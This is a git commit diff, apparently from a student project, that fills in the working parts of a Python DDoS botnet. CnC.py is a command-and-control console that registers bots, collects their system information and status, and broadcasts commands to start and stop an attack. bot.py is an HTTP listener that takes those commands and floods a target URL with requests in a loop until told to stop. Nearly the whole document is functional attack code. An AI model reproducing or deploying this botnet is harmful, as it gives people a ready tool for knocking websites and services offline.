b3707c97aa5f69f623ffd3c4be56709fca474bed
uniRomitoskj <romito.1932500@studenti.uniroma1.it>
2023-05-16 00:15:04 +0200

    funziona tutto quello che serve

--- CnC.py
+++ CnC.py
@@ -7,6 +7,8 @@ import threading
 from termcolor import colored, cprint
 
 
+# TODO save online bots IPs on a file on closing and add them to cnc on startup
+
 class CnC:
     """
     Command & Control center of the botnet.
@@ -24,11 +26,12 @@ class CnC:
             'stop': {'fun': self.__stop, 'desc': self.__stop.__doc__, 'args': 0},
             'exit': {'fun': self.__exit, 'desc': self.__exit.__doc__, 'args': 0}
         }
+        self.__lock = threading.Lock()  # lock for thread-safe access to attributes
 
         self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.__socket.bind(self.__address)
         self.__socket.listen(10)
-        self.__socket.settimeout(2)
+        self.__socket.settimeout(3)
 
     def __bot_connection(self, stop: threading.Event):
 
@@ -40,15 +43,16 @@ class CnC:
 
             address = address[0]
 
-            if address in self.__bots.keys():
-                try:
-                    self.__bots.pop(address)
-                    # print(f"bot {address} removed")
-                except ValueError:
-                    print(f"{address} not in bot list")
-            else:
-                self.__bots[address] = int(client.recv(1024).decode("utf-8"))
-                # print(f"bot {address} added")
+            with self.__lock:
+                if address in self.__bots.keys():
+                    try:
+                        self.__bots.pop(address)
+                        # print(f"bot {address} removed")
+                    except ValueError:
+                        print(f"{address} not in bot list")
+                else:
+                    self.__bots[address] = int(client.recv(1024).decode("utf-8"))
+                    # print(f"bot {address} added")
             client.close()
 
     def __commands(self) -> str:
@@ -62,62 +66,102 @@ class CnC:
         """
         Lists the bots that are connected to the botnet.
         """
-        if self.__bots:
-            return "Bots connected:\n" + "\n".join([f"\t- IP:\t{a}\n\t  Port:\t{p}" for a, p in self.__bots.items()])
-        return colored("No bot connected.", 'red')
+        with self.__lock:
+            if self.__bots:
+                res = ""
+                for addr, port in self.__bots.items():
+                    try:
+                        response = requests.get(f"http://{addr}:{port}/status")
+                        status = json.loads(response.text)
+                        res += f"\t- IP:\t{addr}\n\t  Port:\t{port}\n\t  CONNECTED\n\t  Action:\t{status['action']}\n" \
+                               f"\t  Targets:\t{status['targets']}\n "
+                    except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError):
+                        res += f"\t- IP:\t{addr}\n\t  Port:\t{port}\n\t  DISCONNECTED"
+                return "Bots connected:\n" + res
+            return colored("No bots connected.", 'red')
 
-    def __get_info(self, address) -> str:
+    def __get_info(self, addresses) -> str:
         """
-        Get information about the software and hardware configuration of a bot given his IP address.
+        Get information about the software and hardware configuration of a specific bot given his IP address.
         """
-        if not self.__bots:
-            return colored("No bot connected.", 'red')
+        with self.__lock:
+            if not self.__bots:
+                return colored("No bots connected.", 'red')
 
-        address = address[0]
+            address = addresses[0]
 
-        if address not in self.__bots.keys():
-            return colored("This address does not belong to any connected bot.", 'red')
+            if address not in self.__bots.keys():
+                return colored("This address does not belong to any connected bot.", 'red')
 
-        try:
-            response = requests.get(f"http://{address}:{self.__bots[address]}/info")
-        except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
-            return colored(e, 'red')
+            try:
+                response = requests.get(f"http://{address}:{self.__bots[address]}/info")
+            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
+                return colored(e, 'red')
 
-        res = f"System info of bot {address}:\n"
-        for k, v in json.loads(response.text).items():
-            res += f"\t-{k}: {v}\n"
-        return res
+            res = f"System info of bot {address}:\n"
+            for k, v in json.loads(response.text).items():
+                res += f"\t- {k}: {v}\n"
+            return res
 
-    def __status(self, address):
+    def __status(self, addresses):
         """
-        Check the status of a bot given his IP address.
+        Check the status of a specific bot given his IP address.
         """
-        pass  # TODO implement status
+        with self.__lock:
+            if not self.__bots:
+                return colored("No bots connected.", 'red')
 
-    def __start(self, url):
+            address = addresses[0]
+
+            if address not in self.__bots.keys():
+                return colored("This address does not belong to any connected bot.", 'red')
+
+            try:
+                response = requests.get(f"http://{address}:{self.__bots[address]}/status")
+            except (http.client.RemoteDisconnected, requests.exceptions.ConnectionError) as e:
+                return colored(e, 'red')
+
+            res = f"Status of bot {address}:\n"
+            for k, v in json.loads(response.text).items():
+                res += f"\t- {k}: {v}\n"
+            return res
+
+    def __start(self, urls):
         """
         Start a DDoS attack to the specified url.
         """
-        pass  # TODO implement start
+        url = urls[0]
+        with self.__lock:
+            if len(self.__bots) == 0:
+                return colored("No bot connected.", 'red')
+            responses = {
+                requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
+                for address, port in self.__bots.items()
+            }
+            if len(responses) == 1 and responses.pop() != 200:
+                return colored("Attack did not start...", "red")
+        return colored("Attack started successfully!", "green")
 
     def __stop(self):
         """
         Stop the running DDoS attack.
         """
-        pass  # TODO implement stop
+        with self.__lock:
+            if len(self.__bots) == 0:
+                return colored("No bot connected.", 'red')
+            responses = {
+                requests.get(f"http://{address}:{port}/stop").status_code
+                for address, port in self.__bots.items()
+            }
+            if len(responses) == 1 and responses.pop() != 200:
+                return colored("Attack did not stop...", "red")
+        return colored("Attack stopped successfully!", "green")
 
     def __exit(self) -> str:
         """
         Close the botnet.
         """
         return colored("Closing program...", "red")
-
-    def send_requests(self, url, n):
-        if len(self.__bots) == 0:
-            return colored("No bot connected.", 'red')
-
-        for address, port in self.__bots.items():
-            response = requests.post(f"http://{address}:{port}", json={'url': url, 'n': n})
 
     def cli(self):
 
@@ -129,15 +173,14 @@ class CnC:
         cmd = 0
 
         while cmd != "exit":
-            cprint("\n('help' to view the list of commands).", 'yellow')
+            cprint("\n('help' to view the commands list).", 'yellow')
             cmd = str.lower(input("\n> "))
             result = self.__run_cmd(cmd)
             print(result)
 
-        stop.set()
-        bot_conn.join()
+        stop.set()  # stop the socket thread
 
-    def __run_cmd(self, line):
+    def __run_cmd(self, line):  # TODO implement more than one argument
         try:
             if ' ' in line:
                 cmd, args = line.split(' ', 1)
--- bot.py
+++ bot.py
@@ -1,6 +1,7 @@
 import atexit
 import contextlib
 import platform
+import threading
 import requests
 import socket
 import json
@@ -9,33 +10,66 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 
 
 class Bot(BaseHTTPRequestHandler):
+    status = {'action': 'Idle', 'targets': []}
+    lock = threading.Lock()
+    stop = threading.Event()
+
+    def __response_body(self, func):
+        self.send_response(200)
+        self.send_header('Content-type', 'application/json')
+        self.end_headers()
+        self.wfile.write(bytes(json.dumps(func()), "utf-8"))
 
     def do_GET(self):
         if self.path == '/info':
-            self.GET_info()
+            self.__response_body(self.__info)
+
         elif self.path == '/status':
+            self.__response_body(self.__status)
+
+        elif self.path == '/stop':
             self.send_response(200)
             self.end_headers()
+            self.stop.set()
 
         else:
             self.send_response(404)
             self.end_headers()
 
-    def GET_info(self):
-        self.send_response(200)
+    def do_POST(self):
+        if self.path == '/start':
+            length = int(self.headers['Content-Length'])
+            payload = json.loads(self.rfile.read(length).decode('utf-8'))
+
+            attack = threading.Thread(target=Bot.__attack, args=(self, payload['url'], self.stop))
+            attack.start()
+            self.send_response(200)
+        else:
+            self.send_response(404)
+
+        self.end_headers()
+
+    def __info(self):
         info = platform.uname()._asdict()
         info['processor'] = platform.processor()
-        self.send_header('Content-type', 'application/json')
-        self.end_headers()
-        self.wfile.write(bytes(json.dumps(info), "utf-8"))
+        return info
 
-    def do_POST(self):
-        if self.path == '/send-requests':
-            self.send_requests(0, 0)
+    def __status(self):
+        with self.lock:
+            return self.status
 
-    def send_requests(self, url, n):
-        for _ in range(n):
-            pass
+    def __attack(self, url, stop: threading.Event):
+        with self.lock:
+            self.status['action'] = "Attacking"
+            self.status['targets'].append(url)
+
+        while not stop.is_set():
+            print(f"Request sent, status code:{requests.get(url).status_code}")
+
+        stop.clear()
+        with self.lock:
+            self.status['action'] = "Idle"
+            self.status['targets'].clear()
 
 
 CNC_ADDR = "127.0.0.1"
@@ -55,12 +89,12 @@ def exit_handler():
 
 
 if __name__ == '__main__':
-    port = 8080
+    server_port = 8080
 
-    bot = HTTPServer(('', port), Bot)
+    bot = HTTPServer(('', server_port), Bot)
 
     try:
-        start(port)
+        start(server_port)
         print("Connected to the Command & Control")
         atexit.register(exit_handler)
         bot.serve_forever()
